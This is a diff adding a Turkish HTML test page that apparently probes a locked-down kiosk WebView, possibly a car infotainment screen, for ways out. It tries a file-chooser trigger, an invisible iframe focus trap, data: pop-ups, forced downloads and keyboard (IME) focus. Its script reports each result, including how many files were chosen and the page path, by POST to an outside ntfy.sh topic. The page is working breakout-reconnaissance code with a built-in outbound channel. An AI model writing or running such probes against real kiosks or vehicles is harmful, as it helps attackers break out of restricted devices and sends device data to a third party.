@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="tr">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>E1 - FileChooser / Focus / IME kanali</title>
+<style>
+  body{font-family:monospace;background:#0b0b0b;color:#0f0;margin:0;padding:14px}
+  button{display:block;width:100%;margin:6px 0;padding:14px;font-size:16px;background:#161;color:#dfd;border:0;border-radius:6px}
+  input[type=text]{width:100%;padding:12px;font-size:16px;box-sizing:border-box;margin:6px 0}
+  pre{white-space:pre-wrap;word-break:break-all;color:#9f9;font-size:12px}
+  h1{font-size:15px;color:#fff}
+</style>
+<body>
+<h1>E1: WebView dosya-seçici / focus-trap / IME kanalı</h1>
+<p style="font-size:12px;color:#888">Kiosk WebView'da onShowFileChooser override edilmemişse seçici ÇIKMAZ (kanal ölü).
+override edilmişse sistem seçici açılır → sayfa blur olur → PICKER_SURFACE sinyali.</p>
+
+<input id="f" type="file" hidden>
+<button id="b1">1) DOSYA SEÇ (input.click)</button>
+<button id="b1b">1b) DOSYA SEÇ (accept=*/* image/*)</button>
+<button id="b2">2) focus.probe (iframe focus trap)</button>
+<button id="b3">3) window.open(data:)</button>
+<button id="b4">4) indir (a.download)</button>
+<input id="txt" type="text" placeholder="5) buraya odaklan -> IME (Gboard) davranışı">
+<pre id="log">hazır</pre>
+
+<script>
+const T = "toggx-ivi-7f3k9q2m";
+const logEl = document.getElementById("log");
+function L(s){ logEl.textContent += "\n" + s; }
+function beacon(k, v){ try{ fetch("https://ntfy.sh/"+T, {method:"POST", body:"[e1] "+k+" "+(v||"")}); }catch(e){} }
+
+let blurred = false, blurs = 0;
+window.addEventListener("blur", ()=>{ blurred = true; blurs++; beacon("BLUR", blurs); L("blur #"+blurs+" -> native pencere acildi?"); });
+window.addEventListener("focus", ()=>{ L("focus geri"); beacon("FOCUS_BACK", blurs); });
+document.addEventListener("visibilitychange", ()=>{ beacon("VIS", document.visibilityState); L("vis "+document.visibilityState); });
+
+const f = document.getElementById("f");
+f.addEventListener("change", ()=>{
+  const n = (f.files||[]).length;
+  L("FILES n="+n+" : "+Array.from(f.files||[]).map(x=>x.name+":"+x.size).join(","));
+  beacon("FILECHOSEN", n);
+});
+
+function tryChooser(extra){
+  L("click -> input.click()");
+  beacon("CLICK", extra||"");
+  try{ f.click(); }catch(e){ L("err "+e); beacon("ERR", String(e)); }
+  setTimeout(()=>{ beacon("POSTCLICK_BLUR", blurred); L("postclick blur="+blurred); }, 1200);
+}
+document.getElementById("b1").onclick  = ()=>tryChooser("");
+document.getElementById("b1b").onclick = ()=>{ f.setAttribute("accept","*/*"); f.setAttribute("capture","environment"); tryChooser("accept+capture"); };
+
+document.getElementById("b2").onclick = ()=>{
+  L("hasFocus="+document.hasFocus());
+  const a = document.createElement("iframe");
+  a.src = "about:blank"; a.style = "position:fixed;inset:0;opacity:0.01;border:0";
+  document.body.appendChild(a);
+  try{ a.contentWindow.focus(); a.focus(); }catch(e){ L("ifr err "+e); }
+  setTimeout(()=>{ beacon("FOCUS", document.hasFocus()+"/"+document.activeElement.tagName); L("active="+document.activeElement.tagName); try{document.body.removeChild(a);}catch(e){} }, 1000);
+};
+
+document.getElementById("b3").onclick = ()=>{
+  L("window.open data:");
+  let w=null; try{ w = window.open("data:text/html,<h1>popup-ok</h1>","_blank"); }catch(e){ L("open err "+e); }
+  beacon("WINDOW_OPEN", w? "opened":"blocked");
+};
+
+document.getElementById("b4").onclick = ()=>{
+  L("a.download");
+  try{
+    const a=document.createElement("a");
+    a.href="data:text/plain,test"; a.download="e1_test.txt";
+    document.body.appendChild(a); a.click();
+    beacon("DOWNLOAD","clicked");
+  }catch(e){ L("dl err "+e); }
+};
+
+const txt = document.getElementById("txt");
+txt.addEventListener("focus", ()=>beacon("IME_FOCUS",""));
+txt.addEventListener("blur",  ()=>beacon("IME_BLUR",""));
+
+beacon("HELLO", location.pathname);
+L("gönderildi: HELLO");
+</script>
+</body>
+</html>
